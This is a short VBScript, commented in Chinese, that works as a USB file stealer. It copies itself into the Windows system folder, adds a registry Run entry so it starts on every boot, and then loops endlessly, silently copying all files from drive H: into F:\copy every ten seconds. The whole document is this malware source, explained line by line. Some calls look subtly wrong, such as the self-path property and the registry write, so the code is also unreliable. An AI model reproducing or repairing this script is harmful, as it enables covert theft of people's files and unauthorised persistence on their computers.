On Error Resume Next              '容错语句
Set fso=CreateObject("Scripting.FileSystemObject")        '建立fso对象
dim n
Set n=CreateObject("Wscript.Shell")
Set dir=fso.GetSpecialFolder(1)                   '读取系统目录
fso.GetFile(WScript.ScriptingFullName).Copy(dir&"\copy.vbs") '把自己复制到C:\windows\system32
dim r
Set r=CreateObject("Wscript.Shell")        'r用于写注册表
r.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\","copy.vbs","REG_SZ" '加入自启动项
fso.CreateFolder("F:\copy")      '在F盘下建立文件夹名为copy，用于存放拷贝的U盘文件
for i=1 To 2
i=1                             '写一个死循环用来复制文件
fso.CopyFile "h:\*.*","F:\copy",True     '复制文件任意文件名.任意文件后缀到F盘的copy文件夹下，如果U盘为h盘时，即可
wscript.sleep 10000                     '脚本挂起10秒，10000毫秒
next
